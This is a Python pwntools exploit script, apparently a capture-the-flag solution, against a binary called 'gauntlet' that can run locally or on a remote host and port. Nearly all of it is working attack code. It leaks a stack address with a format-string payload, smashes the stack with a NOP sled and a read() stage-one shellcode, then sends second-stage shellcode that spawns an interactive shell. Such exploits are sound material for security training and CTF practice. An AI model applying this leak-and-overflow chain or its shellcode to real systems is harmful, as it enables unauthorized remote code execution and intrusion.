#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template gauntlet
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'gauntlet')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.HOST and args.PORT:
        return remote(args.HOST, args.PORT, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        No PIE (0x400000)
# Stack:      Executable
# RWX:        Has RWX segments
# Stripped:   No

log.info("""same as before - read 1000 bytes into a buf and then strcpy to a smaller one.

stack memory leak is unreliable (because of env) but through trial and error i found that moving up from env
a bit (not the same amount as on my machine, mind you) i can land in a nop sled and trigger a read() to
grab a second stage payload""")

RIP_DIST = 120

LEAK_PTR_NUM = 6
LEAK_DIST = 0x158
LEAK_PAYLOAD = f"%{LEAK_PTR_NUM}$p".encode('latin1')

log.info("first, we need to leak a symbol and determine libc version...")
io = start()

log.info("leaking _IO_stdfile_0_lock addr...")
io.sendline(LEAK_PAYLOAD)
leak_addr = int(io.readline().strip().decode('latin1'), 16) - LEAK_DIST
log.success(f"leak_addr = {hex(leak_addr)}")

#pause()
payload = asm(shellcraft.read(0, leak_addr,1000))
payload = asm(shellcraft.nop()) * (RIP_DIST - len(payload)) + payload + p64(leak_addr)
io.info("smashing stack and triggering stage 1 payload -  read()...")
io.sendline(payload)
io.info("sending second stage payload...")
payload2 = asm(shellcraft.sh())
payload2 = asm(shellcraft.nop()) * (1000 - len(payload2)) + payload2
#pause()
io.sendline(payload2)


io.interactive()
